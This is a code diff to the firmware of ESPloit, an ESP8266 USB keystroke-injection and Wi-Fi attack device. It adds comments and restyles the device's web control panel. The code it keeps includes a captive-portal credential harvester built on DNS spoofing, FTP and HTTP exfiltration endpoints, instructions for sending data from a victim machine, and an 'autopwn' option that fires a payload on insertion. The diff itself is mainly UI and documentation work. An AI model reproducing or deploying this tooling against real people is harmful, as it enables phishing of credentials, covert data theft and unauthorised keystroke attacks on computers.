@@ -27,7 +27,29 @@
     SOFTWARE.
 */
 
-//We need this stuff
+/*
+ * ============================================================================
+ * INCLUDES
+ * ============================================================================
+ * PROGMEM HTML templates (stored in flash, not RAM):
+ *   HelpText.h    - Help/documentation page (card-based, 19 sections)
+ *   License.h     - MIT license text display page
+ *   inputmode.h   - Keyboard/mouse HID control interface
+ *   spoof_page.h  - ESPortal credential harvester templates (5 themes)
+ *   Duckuino.h    - DuckyScript-to-ESPloit converter (includes jQuery)
+ *   style.h       - Shared CSS theme served from /style.css endpoint
+ *   version.h     - Firmware version strings
+ *
+ * ESP8266 platform libraries:
+ *   ESP8266WiFi      - WiFi AP/STA mode management
+ *   ESP8266WebServer  - HTTP server on port 80 (main UI)
+ *   ESP8266HTTPUpdateServer - OTA firmware update server on port 1337
+ *   ESP8266FtpServer  - FTP server for payload/exfil file management (PASV)
+ *   DNSServer         - DNS spoofing for ESPortal captive portal
+ *   ArduinoJson 5.11.0 - Config file serialization (StaticJsonBuffer API)
+ *   FS (SPIFFS)        - Flash filesystem for payloads and config storage
+ * ============================================================================
+ */
 #include "HelpText.h"
 #include "License.h"
 #include "inputmode.h"
@@ -41,11 +63,12 @@
 #include <ESP8266HTTPUpdateServer.h>
 #include <ESP8266mDNS.h>
 #include <FS.h>
-#include <ArduinoJson.h> // ArduinoJson library 5.11.0 by Benoit Blanchon https://github.com/bblanchon/ArduinoJson
-#include <ESP8266FtpServer.h> // https://github.com/exploitagency/esp8266FTPServer/tree/feature/bbx10_speedup
+#include <ArduinoJson.h>       // v5.11.0 - uses StaticJsonBuffer (NOT v6 JsonDocument)
+#include <ESP8266FtpServer.h>  // https://github.com/exploitagency/esp8266FTPServer/tree/feature/bbx10_speedup
 #include <DNSServer.h>
 #include <ESP8266mDNS.h>
 #include "Duckuino.h"
+#include "style.h"             // Shared CSS theme - served from /style.css with browser caching
 //#include <SoftwareSerial.h>
 //#include <DoubleResetDetector.h> // Double Reset Detector library VERSION: 1.0.0 by Stephen Denne https://github.com/datacute/DoubleResetDetector
 
@@ -63,7 +86,13 @@ DoubleResetDetector drd(DRD_TIMEOUT, DRD_ADDRESS);
 
 #define LED_BUILTIN 2
 
-// Port for web server
+/*
+ * Server instances:
+ *   server (port 80)   - Main web UI, payload management, ESPortal
+ *   httpServer (1337)   - OTA firmware update endpoint (/update)
+ *   ftpSrv              - FTP server for payload/exfil file access (PASV mode)
+ *   dnsServer (port 53) - DNS spoofing for ESPortal captive portal
+ */
 ESP8266WebServer server(80);
 ESP8266WebServer httpServer(1337);
 ESP8266HTTPUpdateServer httpUpdater;
@@ -105,6 +134,13 @@ int autopwn;
 char autopayload[64];
 int open_network=0;
 
+/*
+ * runpayload() - Execute a stored payload file from SPIFFS
+ * Reads the autopayload file line-by-line and sends HID commands
+ * via serial to the ATmega 32u4 coprocessor.
+ * Supports: Rem, DefaultDelay, CustomDelay, BlinkLED, and all
+ * HID commands (Print, PrintLine, Press, MouseMove, etc.)
+ */
 void runpayload() {
     File f = SPIFFS.open(autopayload, "r");
     int defaultdelay = DelayLength;
@@ -170,6 +206,10 @@ void runpayload() {
     DelayLength = settingsdefaultdelay;
 }
 
+/* settingsPage() - Render the device configuration form
+ * Sections: WiFi config, Admin credentials, FTP, ESPortal, Payload settings
+ * All form fields POST to /settings (handled by handleSubmitSettings)
+ * Radio buttons use checked="" attribute from current config values */
 void settingsPage()
 {
   if(!server.authenticate(update_username, update_password))
@@ -224,86 +264,81 @@ void settingsPage()
     hiddenyes="";
     hiddenno=" checked=\"checked\"";
   }
-  server.send(200, "text/html", 
+  server.send(200, "text/html",
   String()+
   F(
-  "<!DOCTYPE HTML>"
-  "<html>"
-  "<head>"
-  "<meta name = \"viewport\" content = \"width = device-width, initial-scale = 1.0, maximum-scale = 1.0, user-scalable=0\">"
+  "<!DOCTYPE HTML><html><head>"
+  "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
   "<title>ESPloit Settings</title>"
-  "<style>"
-  "\"body { background-color: #808080; font-family: Arial, Helvetica, Sans-Serif; Color: #000000; }\""
-  "</style>"
-  "</head>"
-  "<body>"
-  "<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>"
-  "<h1>ESPloit Settings</h1>"
-  "<a href=\"/restoredefaults\"><button>Restore Default Configuration</button></a>"
-  "<hr>"
-  "<FORM action=\"/settings\"  id=\"configuration\" method=\"post\">"
-  "<P>"
-  "<b>WiFi Configuration:</b><br><br>"
-  "<b>Network Type</b><br>"
-  )+
-  F("Access Point Mode: <INPUT type=\"radio\" name=\"accesspointmode\" value=\"1\"")+accesspointmodeyes+F("><br>"
-  "Join Existing Network: <INPUT type=\"radio\" name=\"accesspointmode\" value=\"0\"")+accesspointmodeno+F("><br><br>"
-  "<b>Hidden<br></b>"
-  "Yes <INPUT type=\"radio\" name=\"hidden\" value=\"1\"")+hiddenyes+F("><br>"
-  "No <INPUT type=\"radio\" name=\"hidden\" value=\"0\"")+hiddenno+F("><br><br>"
-  "SSID: <input type=\"text\" name=\"ssid\" value=\"")+ssid+F("\" maxlength=\"31\" size=\"31\"><br>"
-  "Password: <input type=\"password\" name=\"password\" value=\"")+password+F("\" maxlength=\"64\" size=\"31\"><br>"
-  "Channel: <select name=\"channel\" form=\"configuration\"><option value=\"")+channel+"\" selected>"+channel+F("</option><option value=\"1\">1</option><option value=\"2\">2</option><option value=\"3\">3</option><option value=\"4\">4</option><option value=\"5\">5</option><option value=\"6\">6</option><option value=\"7\">7</option><option value=\"8\">8</option><option value=\"9\">9</option><option value=\"10\">10</option><option value=\"11\">11</option><option value=\"12\">12</option><option value=\"13\">13</option><option value=\"14\">14</option></select><br><br>"
-  "IP: <input type=\"text\" name=\"local_IPstr\" value=\"")+local_IPstr+F("\" maxlength=\"16\" size=\"31\"><br>"
-  "Gateway: <input type=\"text\" name=\"gatewaystr\" value=\"")+gatewaystr+F("\" maxlength=\"16\" size=\"31\"><br>"
-  "Subnet: <input type=\"text\" name=\"subnetstr\" value=\"")+subnetstr+F("\" maxlength=\"16\" size=\"31\"><br><br>"
-  "<hr>"
-  "<b>ESPloit Administration Settings:</b><br><br>"
-  "Username: <input type=\"text\" name=\"update_username\" value=\"")+update_username+F("\" maxlength=\"31\" size=\"31\"><br>"
-  "Password: <input type=\"password\" name=\"update_password\" value=\"")+update_password+F("\" maxlength=\"64\" size=\"31\"><br><br>"
-  "<hr>"
-  "<b>FTP Exfiltration Server Settings</b><br>"
-  "<small>Changes require a reboot.</small><br>"
-  "Enabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"1\"")+ftpenabledyes+F("><br>"
-  "Disabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"0\"")+ftpenabledno+F("><br><br>"
-  "FTP Username: <input type=\"text\" name=\"ftp_username\" value=\"")+ftp_username+F("\" maxlength=\"31\" size=\"31\"><br>"
-  "FTP Password: <input type=\"password\" name=\"ftp_password\" value=\"")+ftp_password+F("\" maxlength=\"64\" size=\"31\"><br><br>"
-  "<hr>"
-  "<b>ESPortal Credential Harvester Settings</b><br>"
-  "<small>Changes require a reboot.</small><br>"
-  "<small>When enabled ESPloit main menu will appear on http://<b>IP-HERE</b>/esploit</small><br>"
-  "<small>Do not leave any line blank or as a duplicate of another.</small><br>"
-  "Enabled <INPUT type=\"radio\" name=\"esportalenabled\" value=\"1\"")+esportalenabledyes+F("><br>"
-  "Disabled <INPUT type=\"radio\" name=\"esportalenabled\" value=\"0\"")+esportalenabledno+F("><br><br>"
-  "Welcome Domain: <input type=\"text\" name=\"welcome_domain\" value=\"")+welcome_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "Welcome Page On: <input type=\"text\" name=\"welcome_redirect\" value=\"")+welcome_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "Site1 Domain: <input type=\"text\" name=\"site1_domain\" value=\"")+site1_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "Site1 Page On: <input type=\"text\" name=\"site1_redirect\" value=\"")+site1_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "Site2 Domain: <input type=\"text\" name=\"site2_domain\" value=\"")+site2_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "Site2 Page On: <input type=\"text\" name=\"site2_redirect\" value=\"")+site2_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "Site3 Domain: <input type=\"text\" name=\"site3_domain\" value=\"")+site3_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "Site3 Page On: <input type=\"text\" name=\"site3_redirect\" value=\"")+site3_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "Catch All Page On: <input type=\"text\" name=\"site_other_redirect\" value=\"")+site_other_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
-  "<hr>"
-  "<b>Payload Settings:</b><br><br>"
-  "Delay Between Sending Lines of Code in Payload:<br><input type=\"number\" name=\"DelayLength\" value=\"")+DelayLength+F("\" maxlength=\"31\" size=\"10\"> milliseconds (Default: 2000)<br><br>"
-  "Delay Before Starting a Live or Auto Deploy Payload:<br><input type=\"number\" name=\"LivePayloadDelay\" value=\"")+livepayloaddelay+F("\" maxlength=\"31\" size=\"10\"> milliseconds (Default: 3000)<br><br>"
-  "<b>Automatically Deploy Payload Upon Insetion</b><br>"
-  "Yes <INPUT type=\"radio\" name=\"autopwn\" value=\"1\"")+autopwnyes+F("><br>"
-  "No <INPUT type=\"radio\" name=\"autopwn\" value=\"0\"")+autopwnno+F("><br><br>"
-  "Automatic Payload: <input type=\"text\" name=\"autopayload\" value=\"")+autopayload+F("\" maxlength=\"64\" size=\"31\"><br><br>"
+  "<link rel=\"stylesheet\" href=\"/style.css\">"
+  "</head><body>"
+  "<div class=\"nav\"><span class=\"brand\">ESPloit Settings</span><a href=\"/esploit\">Dashboard</a><a href=\"/restoredefaults\" class=\"btn btn-d\">Restore Defaults</a></div>"
+  "<FORM action=\"/settings\" id=\"configuration\" method=\"post\">"
+  "<div class=\"card\"><h2>WiFi Configuration</h2>"
+  "<div class=\"fr\"><label>Network Type</label><span>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"accesspointmode\" value=\"1\"")+accesspointmodeyes+F(">Access Point</label>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"accesspointmode\" value=\"0\"")+accesspointmodeno+F(">Join Network</label>"
+  "</span></div>"
+  "<div class=\"fr\"><label>Hidden SSID</label><span>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"hidden\" value=\"1\"")+hiddenyes+F(">Yes</label>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"hidden\" value=\"0\"")+hiddenno+F(">No</label>"
+  "</span></div>"
+  "<div class=\"fr\"><label>SSID</label><input type=\"text\" name=\"ssid\" value=\"")+ssid+F("\" maxlength=\"31\"></div>"
+  "<div class=\"fr\"><label>Password</label><input type=\"password\" name=\"password\" value=\"")+password+F("\" maxlength=\"64\"></div>"
+  "<div class=\"fr\"><label>Channel</label><select name=\"channel\" form=\"configuration\"><option value=\"")+channel+"\" selected>"+channel+F("</option><option value=\"1\">1</option><option value=\"2\">2</option><option value=\"3\">3</option><option value=\"4\">4</option><option value=\"5\">5</option><option value=\"6\">6</option><option value=\"7\">7</option><option value=\"8\">8</option><option value=\"9\">9</option><option value=\"10\">10</option><option value=\"11\">11</option><option value=\"12\">12</option><option value=\"13\">13</option><option value=\"14\">14</option></select></div>"
+  "<div class=\"fr\"><label>IP Address</label><input type=\"text\" name=\"local_IPstr\" value=\"")+local_IPstr+F("\" maxlength=\"16\"></div>"
+  "<div class=\"fr\"><label>Gateway</label><input type=\"text\" name=\"gatewaystr\" value=\"")+gatewaystr+F("\" maxlength=\"16\"></div>"
+  "<div class=\"fr\"><label>Subnet</label><input type=\"text\" name=\"subnetstr\" value=\"")+subnetstr+F("\" maxlength=\"16\"></div>"
+  "</div>"
+  "<div class=\"card\"><h2>Administration</h2>"
+  "<div class=\"fr\"><label>Username</label><input type=\"text\" name=\"update_username\" value=\"")+update_username+F("\" maxlength=\"31\"></div>"
+  "<div class=\"fr\"><label>Password</label><input type=\"password\" name=\"update_password\" value=\"")+update_password+F("\" maxlength=\"64\"></div>"
+  "</div>"
+  "<div class=\"card\"><h2>FTP Exfiltration Server</h2><small>Changes require a reboot.</small><br><br>"
+  "<div class=\"fr\"><label>Status</label><span>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"ftpenabled\" value=\"1\"")+ftpenabledyes+F(">Enabled</label>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"ftpenabled\" value=\"0\"")+ftpenabledno+F(">Disabled</label>"
+  "</span></div>"
+  "<div class=\"fr\"><label>FTP Username</label><input type=\"text\" name=\"ftp_username\" value=\"")+ftp_username+F("\" maxlength=\"31\"></div>"
+  "<div class=\"fr\"><label>FTP Password</label><input type=\"password\" name=\"ftp_password\" value=\"")+ftp_password+F("\" maxlength=\"64\"></div>"
+  "</div>"
+  "<div class=\"card\"><h2>ESPortal Credential Harvester</h2>"
+  "<small>Changes require a reboot. When enabled, main menu moves to <code>http://IP/esploit</code></small><br>"
+  "<small>Do not leave any line blank or as a duplicate of another.</small><br><br>"
+  "<div class=\"fr\"><label>Status</label><span>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"esportalenabled\" value=\"1\"")+esportalenabledyes+F(">Enabled</label>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"esportalenabled\" value=\"0\"")+esportalenabledno+F(">Disabled</label>"
+  "</span></div>"
+  "<div class=\"fr\"><label>Welcome Domain</label><input type=\"text\" name=\"welcome_domain\" value=\"")+welcome_domain+F("\" maxlength=\"127\"></div>"
+  "<div class=\"fr\"><label>Welcome Page On</label><input type=\"text\" name=\"welcome_redirect\" value=\"")+welcome_redirect+F("\" maxlength=\"127\"></div>"
+  "<div class=\"fr\"><label>Site1 Domain</label><input type=\"text\" name=\"site1_domain\" value=\"")+site1_domain+F("\" maxlength=\"127\"></div>"
+  "<div class=\"fr\"><label>Site1 Page On</label><input type=\"text\" name=\"site1_redirect\" value=\"")+site1_redirect+F("\" maxlength=\"127\"></div>"
+  "<div class=\"fr\"><label>Site2 Domain</label><input type=\"text\" name=\"site2_domain\" value=\"")+site2_domain+F("\" maxlength=\"127\"></div>"
+  "<div class=\"fr\"><label>Site2 Page On</label><input type=\"text\" name=\"site2_redirect\" value=\"")+site2_redirect+F("\" maxlength=\"127\"></div>"
+  "<div class=\"fr\"><label>Site3 Domain</label><input type=\"text\" name=\"site3_domain\" value=\"")+site3_domain+F("\" maxlength=\"127\"></div>"
+  "<div class=\"fr\"><label>Site3 Page On</label><input type=\"text\" name=\"site3_redirect\" value=\"")+site3_redirect+F("\" maxlength=\"127\"></div>"
+  "<div class=\"fr\"><label>Catch All Page On</label><input type=\"text\" name=\"site_other_redirect\" value=\"")+site_other_redirect+F("\" maxlength=\"127\"></div>"
+  "</div>"
+  "<div class=\"card\"><h2>Payload Settings</h2>"
+  "<div class=\"fr\"><label>Line Delay (ms)</label><input type=\"number\" name=\"DelayLength\" value=\"")+DelayLength+F("\" maxlength=\"31\"> <small>Default: 2000</small></div>"
+  "<div class=\"fr\"><label>Startup Delay (ms)</label><input type=\"number\" name=\"LivePayloadDelay\" value=\"")+livepayloaddelay+F("\" maxlength=\"31\"> <small>Default: 3000</small></div>"
+  "<div class=\"fr\"><label>Auto-Deploy</label><span>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"autopwn\" value=\"1\"")+autopwnyes+F(">Yes</label>"
+  "<label class=\"rl\"><INPUT type=\"radio\" name=\"autopwn\" value=\"0\"")+autopwnno+F(">No</label>"
+  "</span></div>"
+  "<div class=\"fr\"><label>Auto Payload</label><input type=\"text\" name=\"autopayload\" value=\"")+autopayload+F("\" maxlength=\"64\"></div>"
+  "</div>"
   "<INPUT type=\"radio\" name=\"SETTINGS\" value=\"1\" hidden=\"1\" checked=\"checked\">"
-  "<hr>"
-  "<INPUT type=\"submit\" value=\"Apply Settings\">"
+  "<div class=\"flex\"><INPUT type=\"submit\" value=\"Apply Settings\" class=\"btn btn-p\"> <a href=\"/reboot\" class=\"btn btn-w\">Reboot Device</a></div>"
   "</FORM>"
-  "<br><a href=\"/reboot\"><button>Reboot Device</button></a>"
-  "</P>"
-  "</body>"
-  "</html>"
+  "</body></html>"
   )
   );
 }
 
+/* handleSettings() - Route handler for /settings
+ * GET  -> renders settingsPage() form
+ * POST -> handleSubmitSettings() saves config to SPIFFS JSON */
 void handleSettings()
 {
   if (server.hasArg("SETTINGS")) {
@@ -321,6 +356,9 @@ void returnFail(String msg)
   server.send(500, "text/plain", msg + "\r\n");
 }
 
+/* handleSubmitSettings() - Process settings form POST
+ * Reads all form args into global config vars, saves to SPIFFS JSON,
+ * then reloads config. Some settings (WiFi, FTP, ESPortal) require reboot. */
 void handleSubmitSettings()
 {
   String SETTINGSvalue;
@@ -358,7 +396,7 @@ void handleSubmitSettings()
   
   if (SETTINGSvalue == "1") {
     saveConfig();
-    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/reboot\"><button>Reboot Device</button></a><br><br>Settings have been saved.<br>Some setting may require manually rebooting ESPloit before taking effect.<br>If network configuration has changed then connect to the new network to access ESPloit."));
+    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"success\">Settings saved successfully.</div><div class=\"card\"><p>Some settings may require a reboot before taking effect.</p><p>If network configuration changed, connect to the new network to access ESPloit.</p><br><div class=\"flex\"><a href=\"/reboot\" class=\"btn btn-w\">Reboot Device</a><a href=\"/esploit\" class=\"btn\">Back to Dashboard</a></div></div></body></html>"));
     loadConfig();
   }
   else if (SETTINGSvalue == "0") {
@@ -589,6 +627,9 @@ void handleFileUpload()
   }
 }
 
+/* ListPayloads() - List files in a SPIFFS directory as a styled HTML table
+ * Serves two paths: /listpayloads (payloads dir) and /exfiltrate/list (root dir)
+ * Exfiltrate view also shows exfiltration method reference (Serial, HTTP, FTP) */
 void ListPayloads(){
   String directory;
   if(server.uri() == "/listpayloads") directory="/payloads";
@@ -601,18 +642,18 @@ void ListPayloads(){
   used=fs_info.usedBytes;
   String freespace;
   freespace=fs_info.totalBytes-fs_info.usedBytes;
-  String FileList = "<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>";
+  String FileList = "<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body>";
   Dir dir = SPIFFS.openDir(directory);
-  if(server.uri() == "/listpayloads") FileList += "File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><a href=\"/uploadpayload\">Upload Payload</a><br><br><a href=\"/livepayload\">Live Payload Mode</a><br><br><table border='1'><tr><td><b>Display Payload Contents</b></td><td><b>Size in Bytes</b></td><td><b>Run Payload</b></td><td><b>Download File</b></td><td><b>Delete Payload</b></td></tr>";
-  if(server.uri() == "/exfiltrate/list") FileList += String()+F("To exfiltrate data using the serial method find the com port device is connected to<br>then be sure to set the baud rate to 38400 on the victim machine<br>and send the text \"SerialEXFIL:\" followed by the data to exfiltrate.<br>To exfiltrate data using the WiFi methods be sure ESPloit and Target machine are on the same network.<br>Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.<br><small>Current Network Configuration: ESPloit's IP= <b>")+local_IPstr+"</b> SSID = <b>"+ssid+"</b> PASSWORD = <b>"+password+"</b><br>Windows: netsh wlan set hostednetwork mode=allow ssid=\"<b>"+ssid+"</b>\" key=\"<b>"+password+"</b>\"<br>Linux: nmcli dev wifi connect <b>"+ssid+"</b> password <b>"+password+"</b></small><br>For HTTP exfiltration method point the target machine to the url listed below:<br><small>http://<b>"+local_IPstr+"</b>/exfiltrate?file=<b>FILENAME.TXT</b>&data=<b>EXFILTRATED-DATA-HERE</b></small><br>For FTP exfiltration method use the credentials listed below:<br><small>Server: <b>"+local_IPstr+"</b> Username: <b>"+ftp_username+"</b> Password: <b>"+ftp_password+"</b></small><br>See the example payloads for more in depth examples.<br><br>File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><table border='1'><tr><td><b>Display File Contents</b></td><td><b>Size in Bytes</b></td><td><b>Download File</b></td><td><b>Delete File</b></td></tr>";
+  if(server.uri() == "/listpayloads") FileList += "<div class=\"nav\"><span class=\"brand\">Payloads</span><a href=\"/esploit\">Dashboard</a><a href=\"/uploadpayload\">Upload</a><a href=\"/livepayload\">Live Mode</a></div><div class=\"card\"><div class=\"stat\"><span>Total: <b>"+total+"</b> B</span><span>Free: <b>"+freespace+"</b> B</span><span>Used: <b>"+used+"</b> B</span></div></div><div class=\"card\"><table><tr><th>Payload</th><th>Size</th><th>Actions</th></tr>";
+  if(server.uri() == "/exfiltrate/list") FileList += String()+F("<div class=\"nav\"><span class=\"brand\">Exfiltrated Data</span><a href=\"/esploit\">Dashboard</a></div><div class=\"card\"><h2>Exfiltration Methods</h2><p><b>Serial:</b> Set baud to 38400, send <code>SerialEXFIL:</code> followed by data.</p><p><b>HTTP:</b> <code>http://<b>")+local_IPstr+"</b>/exfiltrate?file=<b>FILE</b>&amp;data=<b>DATA</b></code></p><p><b>FTP (PASV):</b> Server: <b>"+local_IPstr+"</b> User: <b>"+ftp_username+"</b> Pass: <b>"+ftp_password+"</b></p><small>Network: IP=<b>"+local_IPstr+"</b> SSID=<b>"+ssid+"</b></small></div><div class=\"card\"><div class=\"stat\"><span>Total: <b>"+total+"</b> B</span><span>Free: <b>"+freespace+"</b> B</span><span>Used: <b>"+used+"</b> B</span></div><table><tr><th>File</th><th>Size</th><th>Actions</th></tr>";
   while (dir.next()) {
     String FileName = dir.fileName();
     File f = dir.openFile("r");
     FileList += " ";
-    if(server.uri() == "/listpayloads") FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\"/dopayload?payload="+FileName+"\"><button>Run Payload</button></a></td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletepayload?payload="+FileName+"\"><button>Delete Payload</button></td></tr>";
-    if((server.uri() == "/exfiltrate/list")&&(!FileName.startsWith("/payloads/"))&&(!FileName.startsWith("/esploit.json"))&&(!FileName.startsWith("/esportal.json"))&&(!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletepayload?payload="+FileName+"\"><button>Delete File</button></td></tr>";
+    if(server.uri() == "/listpayloads") FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td><td>"+f.size()+"</td><td class=\"flex\"><a href=\"/dopayload?payload="+FileName+"\" class=\"btn btn-p\">Run</a><a href=\""+FileName+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+FileName+"\" class=\"btn btn-d\">Delete</a></td></tr>";
+    if((server.uri() == "/exfiltrate/list")&&(!FileName.startsWith("/payloads/"))&&(!FileName.startsWith("/esploit.json"))&&(!FileName.startsWith("/esportal.json"))&&(!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td><td>"+f.size()+"</td><td class=\"flex\"><a href=\""+FileName+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+FileName+"\" class=\"btn btn-d\">Delete</a></td></tr>";
   }
-  FileList += "</table>";
+  FileList += "</table></div></body></html>";
   server.send(200, "text/html", FileList);
 }
 
@@ -628,6 +669,9 @@ bool RawFile(String rawfile) {
   return false;
 }
 
+/* ShowPayloads() - Display contents of a single payload/exfil file
+ * Non-.txt files redirect to raw download. Text files render in <pre> block.
+ * Three conditional layouts: payload (with Run button), exfil data, other */
 void ShowPayloads(){
   webString="";
   String payload;
@@ -640,13 +684,49 @@ void ShowPayloads(){
     server.sendHeader("Location", String("http://"+String(local_IPstr)+payload), true);
     server.send ( 302, "text/plain", "");
   }
-  if (payload.startsWith("/payloads/")) ShowPL = String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/dopayload?payload=")+payload+"\"><button>Run Payload</button></a> - <a href=\""+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete Payload</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
-  else if (!payload.startsWith("/payloads")) ShowPL = String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
-  else ShowPL = String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
+  if (payload.startsWith("/payloads/")) ShowPL = String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Payload Viewer</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a></div><div class=\"card\"><div class=\"flex mb\"><a href=\"/dopayload?payload=")+payload+"\" class=\"btn btn-p\">Run Payload</a><a href=\""+payload+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+payload+"\" class=\"btn btn-d\">Delete</a></div><h3>"+payload+"</h3><pre>"+webString+"</pre></div></body></html>";
+  else if (!payload.startsWith("/payloads")) ShowPL = String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">File Viewer</span><a href=\"/esploit\">Dashboard</a><a href=\"/exfiltrate/list\">Exfiltrated Data</a></div><div class=\"card\"><div class=\"flex mb\"><a href=\"")+payload+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+payload+"\" class=\"btn btn-d\">Delete</a></div><h3>"+payload+"</h3><pre>"+webString+"</pre></div></body></html>";
+  else ShowPL = String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">File Viewer</span><a href=\"/esploit\">Dashboard</a><a href=\"/exfiltrate/list\">Data</a></div><div class=\"card\"><div class=\"flex mb\"><a href=\"")+payload+"\" class=\"btn\">Download</a><a href=\"/deletepayload?payload="+payload+"\" class=\"btn btn-d\">Delete</a></div><h3>"+payload+"</h3><pre>"+webString+"</pre></div></body></html>";
   webString="";
   server.send(200, "text/html", ShowPL);
 }
 
+/*
+ * ============================================================================
+ * setup() - Initialize hardware, load config, register all HTTP routes
+ * ============================================================================
+ * Route map:
+ *   /style.css         - Shared CSS theme (PROGMEM, cached 24h)
+ *   / or /esploit      - Dashboard (icon grid, storage stats)
+ *   /settings          - Configuration form (GET=view, POST=save)
+ *   /firmware           - Firmware version check + OTA upload iframe
+ *   /autoupdatefirmware - One-click OTA from legacysecuritygroup.com
+ *   /livepayload        - Live payload editor (textarea + run)
+ *   /runlivepayload     - Execute live payload via serial to 32u4
+ *   /listpayloads       - Payload file listing with run/download/delete
+ *   /uploadpayload      - File upload form
+ *   /upload (POST)      - Handle multipart file upload to /payloads/
+ *   /showpayload        - View payload/exfil file contents
+ *   /dopayload          - Execute a stored payload file
+ *   /deletepayload      - Confirm + delete a file
+ *   /format             - Confirm + format SPIFFS
+ *   /reboot             - Reboot device
+ *   /restoredefaults    - Confirm + reset to factory config
+ *   /exfiltrate         - HTTP exfiltration endpoint (GET with file+data)
+ *   /exfiltrate/list    - List exfiltrated data files
+ *   /help               - Documentation page (PROGMEM)
+ *   /license            - MIT license text (PROGMEM)
+ *   /inputmode          - HID keyboard/mouse control (PROGMEM)
+ *   /duckuino           - DuckyScript converter (PROGMEM)
+ *   /validate           - ESPortal credential capture endpoint
+ *
+ * ESPortal mode (when enabled):
+ *   - Main UI moves to /esploit, root becomes captive portal
+ *   - DNS server spoofs all domains to device IP
+ *   - 404 handler redirects to configured spoof pages
+ *   - Custom templates loaded from SPIFFS if present
+ * ============================================================================
+ */
 void setup(void)
 {
 //  SOFTserial.begin(38400);
@@ -694,7 +774,7 @@ void setup(void)
       ardversion = "2.0(Guessing)";
       Serial.println("GetVersion:X"); //check 32u4 version info
     }
